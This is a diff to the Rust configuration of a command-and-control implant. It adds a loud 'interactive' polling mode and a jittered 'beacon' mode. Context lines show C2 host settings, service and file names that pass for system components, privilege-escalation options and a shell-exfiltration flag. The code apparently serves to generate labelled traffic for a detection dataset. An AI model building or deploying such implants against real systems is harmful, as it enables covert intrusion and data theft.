@@ -38,7 +38,25 @@ pub struct Config {
     // Pacing
     pub stage_pause_secs: u64,
     pub chunk_pause_secs: u64,
+
+    /// Operator-presence profile, selected at implant generation time.
+    /// Interactive = loud: short fixed-interval polling, no jitter (operator
+    /// actively on the box, easy to detect). Beacon = low-and-slow: interval
+    /// + jitter. See IMPLANT_MODE env var (set by payload-gen).
+    pub mode: ImplantMode,
 }
+
+#[derive(PartialEq, Clone, Copy)]
+pub enum ImplantMode {
+    /// Loud profile — polls the C2 every INTERACTIVE_POLL_SECS, no jitter.
+    Interactive,
+    /// Low-and-slow profile — polls on beacon_interval with jitter.
+    Beacon,
+}
+
+/// How often (seconds) an interactive implant polls the C2. Short on purpose:
+    /// the chatty, constant check-ins are the "loud" detection signal.
+pub const INTERACTIVE_POLL_SECS: u64 = 1;
 
 #[derive(PartialEq)]
 pub enum EscalateMethod {
@@ -68,6 +86,12 @@ impl Config {
         let beacon_name = option_env!("BEACON_NAME").unwrap_or("update-checker").into();
         let service_name = option_env!("SERVICE_NAME").unwrap_or("systemd-logind-helper").into();
         let implant_path = option_env!("IMPLANT_PATH").unwrap_or("/usr/bin/dbus-runner").into();
+        let mode = match option_env!("IMPLANT_MODE") {
+            Some("beacon") => ImplantMode::Beacon,
+            // Default: interactive (loud). Operator-presence profile chosen at
+            // implant generation time via payload-gen --mode.
+            _ => ImplantMode::Interactive,
+        };
 
         Config {
             c2_host,
@@ -92,6 +116,7 @@ impl Config {
             escalate_via: EscalateMethod::CopyFail,
             stage_pause_secs: 3,
             chunk_pause_secs: 5,
+            mode,
         }
     }
 
@@ -106,6 +131,15 @@ impl Config {
         if self.escalate_via == EscalateMethod::Pkexec { "1-loud" }
         else if self.escalate_via == EscalateMethod::CopyFail && self.shell_exfil { "2-mixed" }
         else { "3-stealth" }
+    }
+
+    /// Human-readable operator-presence profile, for beacons / system info so
+    /// the dataset records which profile generated the traffic.
+    pub fn mode_label(&self) -> &'static str {
+        match self.mode {
+            ImplantMode::Interactive => "interactive",
+            ImplantMode::Beacon => "beacon",
+        }
     }
 
     pub fn beacon_sleep(&self) {
